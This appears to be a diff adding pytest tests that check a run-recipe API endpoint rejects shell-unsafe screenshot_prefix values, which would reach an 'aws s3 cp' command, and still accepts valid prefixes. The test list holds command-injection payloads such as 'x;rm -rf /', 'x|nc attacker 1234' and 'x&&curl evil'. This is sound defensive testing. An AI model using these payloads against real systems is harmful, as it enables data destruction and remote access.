@@ -360,6 +360,67 @@ def test_run_recipe_validates_recipe_yaml(bearer_client, configured):
     assert resp.status_code == 400
 
 
+@pytest.mark.parametrize(
+    "malicious",
+    [
+        "x;rm -rf /",
+        "x$(whoami)",
+        "x`id`",
+        "x|nc attacker 1234",
+        "x&&curl evil",
+        "x>/tmp/pwn",
+        "x y",  # whitespace
+        'x"y',  # quote
+        "x'y",  # apostrophe
+        "x\\y",  # backslash
+        "x\ny",  # newline
+        "/abs/path",  # leading slash
+        "a/../b",  # traversal
+    ],
+)
+def test_run_recipe_rejects_shell_unsafe_screenshot_prefix(
+    bearer_client, configured, malicious
+):
+    """screenshot_prefix lands in an ``aws s3 cp`` shell command on the
+    EC2 instance via SSM. Anything outside ``[A-Za-z0-9_./-]`` must be
+    rejected at the serializer so it never reaches the shell."""
+    resp = bearer_client.post(
+        "/api/mobile/run-recipe",
+        {"recipe_yaml": "x", "screenshot_prefix": malicious},
+        format="json",
+    )
+    assert resp.status_code == 400, (
+        f"screenshot_prefix={malicious!r} was accepted; injection vector"
+    )
+    assert resp.json()["error"]["code"] == "invalid-request"
+
+
+@pytest.mark.parametrize(
+    "safe",
+    [
+        "run-1",
+        "opp/run-1",
+        "opps/abc-def/run-001",
+        "a.b.c",
+        "_underscore",
+    ],
+)
+def test_run_recipe_accepts_safe_screenshot_prefix(bearer_client, configured, safe):
+    """The allowlist regex must still admit the legitimate nested-prefix
+    shape the opp Workbench uses."""
+    fake = MagicMock()
+    fake.run_recipe.return_value = RunResult(exit_code=0, stdout="", stderr="", artifacts=[])
+    with patch("apps.mobile.views.EmulatorController", return_value=fake):
+        resp = bearer_client.post(
+            "/api/mobile/run-recipe",
+            {"recipe_yaml": "x", "screenshot_prefix": safe},
+            format="json",
+        )
+    assert resp.status_code == 200, (
+        f"safe prefix {safe!r} rejected: {resp.json()}"
+    )
+
+
 def test_run_recipe_happy_path_acquires_and_releases_lock(bearer_client, configured):
     fake = MagicMock()
     fake.run_recipe.return_value = RunResult(
